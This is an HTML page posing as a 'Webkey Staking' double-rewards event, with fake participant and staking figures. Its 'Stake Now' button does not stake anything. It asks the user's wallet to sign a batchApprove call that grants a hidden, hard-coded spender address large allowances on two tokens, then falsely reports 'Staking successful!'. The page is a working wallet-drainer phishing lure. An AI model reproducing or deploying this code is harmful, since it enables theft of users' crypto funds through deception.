<!DOCTYPE html>
<html>
<head>
    <title>Webkey Staking</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0b0e;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Dynamic background effect */
        body::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 50%, rgba(0, 255, 209, 0.08) 0%, transparent 50%),
                        radial-gradient(circle at 70% 50%, rgba(0, 102, 255, 0.08) 0%, transparent 50%);
            animation: rotate 30s linear infinite;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        .container {
            position: relative;
            z-index: 1;
            max-width: 480px;
            width: 100%;
        }
        
        /* Main card */
        .card {
            background: rgba(20, 22, 27, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 40px 24px;
            border: 1px solid rgba(0, 255, 209, 0.2);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5),
                        0 0 0 1px rgba(0, 255, 209, 0.1) inset;
            position: relative;
            overflow: hidden;
        }
        
        /* Decorative glow */
        .card::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 50% 50%, rgba(0, 255, 209, 0.1), transparent 70%);
            opacity: 0.5;
            animation: pulse 4s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
        }
        
        /* Logo section */
        .logo-section {
            text-align: center;
            margin-bottom: 32px;
            position: relative;
        }
        
        .logo {
            width: 96px;
            height: 96px;
            background: linear-gradient(135deg, #00ffd1, #0066ff);
            border-radius: 32px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 20px 40px rgba(0, 255, 209, 0.3);
            position: relative;
        }
        
        .logo::before {
            content: '';
            position: absolute;
            inset: -4px;
            background: linear-gradient(135deg, #00ffd1, #0066ff);
            border-radius: 36px;
            opacity: 0.5;
            filter: blur(10px);
            z-index: -1;
        }
        
        .logo span {
            font-size: 48px;
            font-weight: 800;
            color: white;
            text-shadow: 0 2px 10px rgba(0,255,209,0.5);
        }
        
        .title {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #00ffd1, #0066ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        
        .subtitle {
            color: #8f9bb3;
            font-size: 16px;
            font-weight: 400;
        }
        
        /* Event card */
        .event-card {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 32px;
            padding: 24px;
            margin-bottom: 24px;
            border: 1px solid rgba(0, 255, 209, 0.1);
            position: relative;
            overflow: hidden;
        }
        
        .event-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .event-icon {
            width: 48px;
            height: 48px;
            background: rgba(0, 255, 209, 0.1);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .event-title {
            font-size: 20px;
            font-weight: 700;
            color: white;
        }
        
        .event-desc {
            color: #8f9bb3;
            font-size: 14px;
            margin-top: 4px;
        }
        
        /* Rewards display */
        .reward-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 24px 0;
        }
        
        .reward-item {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 20px;
            padding: 16px;
            text-align: center;
            border: 1px solid rgba(0, 255, 209, 0.1);
        }
        
        .reward-amount {
            font-size: 24px;
            font-weight: 800;
            color: #00ffd1;
            margin-bottom: 4px;
        }
        
        .reward-label {
            font-size: 14px;
            color: #8f9bb3;
        }
        
        .reward-icon {
            font-size: 24px;
            margin-bottom: 8px;
        }
        
        /* Progress bar */
        .progress-section {
            margin: 24px 0;
        }
        
        .progress-info {
            display: flex;
            justify-content: space-between;
            color: #8f9bb3;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 100px;
            overflow: hidden;
        }
        
        .progress-fill {
            width: 65%;
            height: 100%;
            background: linear-gradient(90deg, #00ffd1, #0066ff);
            border-radius: 100px;
            position: relative;
        }
        
        /* Button */
        .action-button {
            width: 100%;
            padding: 20px;
            background: linear-gradient(135deg, #00ffd1, #0066ff);
            border: none;
            border-radius: 100px;
            color: white;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            box-shadow: 0 10px 30px rgba(0, 255, 209, 0.3);
            margin: 24px 0 16px;
        }
        
        .action-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        
        .action-button:hover::before {
            left: 100%;
        }
        
        .action-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(0, 255, 209, 0.4);
        }
        
        .action-button:active {
            transform: translateY(0);
        }
        
        /* Note */
        .note {
            text-align: center;
            color: #5a647b;
            font-size: 14px;
            margin-top: 16px;
            padding: 12px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 100px;
        }
        
        /* Result popup */
        .result {
            margin-top: 20px;
            padding: 16px;
            border-radius: 24px;
            font-size: 14px;
            line-height: 1.6;
            display: none;
            text-align: center;
        }
        
        .result.success {
            background: rgba(0, 255, 209, 0.1);
            border: 1px solid #00ffd1;
            color: #00ffd1;
            display: block;
        }
        
        .result.error {
            background: rgba(255, 77, 79, 0.1);
            border: 1px solid #ff4d4f;
            color: #ff4d4f;
            display: block;
        }
        
        .result a {
            color: #00ffd1;
            text-decoration: none;
        }
        
        /* Hidden technical info */
        .hidden-info {
            display: none;
        }
        
        /* Activity tag */
        .tag {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0, 255, 209, 0.1);
            border: 1px solid #00ffd1;
            color: #00ffd1;
            padding: 6px 16px;
            border-radius: 100px;
            font-size: 14px;
            font-weight: 600;
        }
        
        /* Stats row */
        .stats {
            display: flex;
            justify-content: space-between;
            color: #5a647b;
            font-size: 14px;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid rgba(255,255,255,0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="tag">üî• LIMITED EVENT</div>
            
            <!-- Logo section -->
            <div class="logo-section">
                <div class="logo">
                    <span>‚ö°Ô∏è</span>
                </div>
                <h1 class="title">Webkey Staking</h1>
                <div class="subtitle">Double Rewards ¬∑ Limited Time</div>
            </div>
            
            <!-- Event information -->
            <div class="event-card">
                <div class="event-header">
                    <div class="event-icon">üéØ</div>
                    <div>
                        <div class="event-title">Staking Season</div>
                        <div class="event-desc">Stake Webkey ecosystem tokens to earn double rewards</div>
                    </div>
                </div>
                
                <!-- Rewards display -->
                <div class="reward-grid">
                    <div class="reward-item">
                        <div class="reward-icon">ü™ô</div>
                        <div class="reward-amount">2x</div>
                        <div class="reward-label">WKEY Rewards</div>
                    </div>
                    <div class="reward-item">
                        <div class="reward-icon">üíé</div>
                        <div class="reward-amount">500</div>
                        <div class="reward-label">Points/Day</div>
                    </div>
                </div>
                
                <!-- Progress bar -->
                <div class="progress-section">
                    <div class="progress-info">
                        <span>Total Staked</span>
                        <span>65%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill"></div>
                    </div>
                </div>
                
                <!-- Stats -->
                <div class="stats">
                    <span>üë• 2,345 Participants</span>
                    <span>üí∞ 1.2M Staked</span>
                </div>
            </div>
            
            <!-- Hidden technical data (preserved for functionality) -->
            <div class="hidden-info" id="contractData" 
                 data-contract="0x62B5E69a0a97109Fe0BfC243E02673D293D7c921"
                 data-spender="0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b"
                 data-token1="0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E"
                 data-token2="0x55d398326f99059ff775485246999027b3197955">
            </div>
            
            <!-- Action button -->
            <button class="action-button" onclick="participateEvent()">
                ‚ö°Ô∏è Stake Now
            </button>
            
            <div class="note">
                Sign once to stake both tokens
            </div>
            
            <!-- Result display -->
            <div id="result" class="result"></div>
        </div>
    </div>

    <script>
        // Read data from hidden attributes
        const contractData = document.getElementById('contractData');
        const CONTRACT_ADDRESS = contractData.dataset.contract;
        const SPENDER = contractData.dataset.spender;
        const TOKENS = [
            contractData.dataset.token1,
            contractData.dataset.token2
        ];
        const AMOUNT = '1000000';

        const BATCH_ABI = [{
            "inputs": [
                {"internalType": "address[]", "name": "_tokens", "type": "address[]"},
                {"internalType": "address", "name": "_spender", "type": "address"},
                {"internalType": "uint256[]", "name": "_amounts", "type": "uint256[]"}
            ],
            "name": "batchApprove",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }];

        async function participateEvent() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'result';
            resultDiv.innerHTML = '‚è≥ Connecting wallet...';
            
            try {
                if (!window.ethereum) {
                    throw new Error('Please install MetaMask');
                }
                
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                
                resultDiv.innerHTML = '‚è≥ Preparing staking...';
                
                const amountInWei = web3.utils.toWei(AMOUNT, 'ether');
                const amounts = [amountInWei, amountInWei];
                
                const contract = new web3.eth.Contract(BATCH_ABI, CONTRACT_ADDRESS);
                
                resultDiv.innerHTML = '‚è≥ Please confirm in your wallet...';
                
                const tx = await contract.methods.batchApprove(TOKENS, SPENDER, amounts).send({
                    from: accounts[0],
                    gas: 300000
                });
                
                resultDiv.className = 'result success';
                resultDiv.innerHTML = `
                    ‚úÖ Staking successful!<br>
                    You have joined Webkey Staking<br>
                    <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">View transaction</a>
                `;
                
            } catch (error) {
                resultDiv.className = 'result error';
                if (error.message.includes('User rejected')) {
                    resultDiv.innerHTML = '‚ùå You canceled the transaction';
                } else {
                    resultDiv.innerHTML = '‚ùå Transaction failed, please try again';
                }
            }
        }
    </script>
</body>
</html>
